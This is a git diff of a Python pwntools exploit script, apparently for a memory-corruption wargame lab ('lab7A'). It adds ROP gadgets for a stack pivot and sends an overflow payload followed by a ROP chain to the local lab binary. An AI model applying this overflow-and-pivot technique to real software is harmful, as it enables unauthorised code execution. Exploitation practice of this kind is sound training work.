@@ -1,14 +1,20 @@
 from pwn import *
-context(arch = 'i386', os = 'linux')
+from struct import pack
+
+context(arch='i386', os='linux')
 
 BIN_PATH = "/hdd/VM-Shared/levels/lab07/lab7A"
+SPACE_BETWEEN_CHUNKS = 0xAE0 - 0x9D0
+
+ESP_PIVOT = pack('<I', 0x08048fcd)  # add esp, 0x24 ; pop ebx ; pop ebp ; ret
+MOV_EAX_EDX = pack('<I', 0x080671c4)  # mov eax, edx ; ret
+XCHG_EAX_ESP = pack('<I', 0x0804bb6c)  # xchg eax, esp ; ret
+
 binary = ELF(BIN_PATH)
 rop = ROP(binary)
 
 
 def build_rop_chain():
-    from struct import pack
-
     rop_chain = ''
 
     rop_chain += pack('<I', 0x0807030a)  # pop edx ; ret
@@ -41,8 +47,11 @@ def build_rop_chain():
     return rop_chain
 
 
-p = process(BIN_PATH)
-pause()
+# p = process(BIN_PATH)
+
+p = gdb.debug(BIN_PATH, '''
+break main
+''')
 
 log.info("Message #1 - Overflowing max_len")
 p.recvuntil("Enter Choice:")
@@ -53,10 +62,11 @@ p.sendline("x" * 131)
 log.info("Message #2 - Preparing room for ROP chain")
 p.recvuntil("Enter Choice:")
 p.sendline("1")
-p.sendline("100") # doesn't matter
+p.sendline("100")
 p.sendline("JUNK" * 25)
 
 log.info("Message #1 - Write ROP chain (with edit)")
 p.recvuntil("Enter Choice:")
 p.sendline("2")
 p.sendline("0")
+p.sendline("x" * (SPACE_BETWEEN_CHUNKS - 132) + ESP_PIVOT + "B" * 0x2C + build_rop_chain())
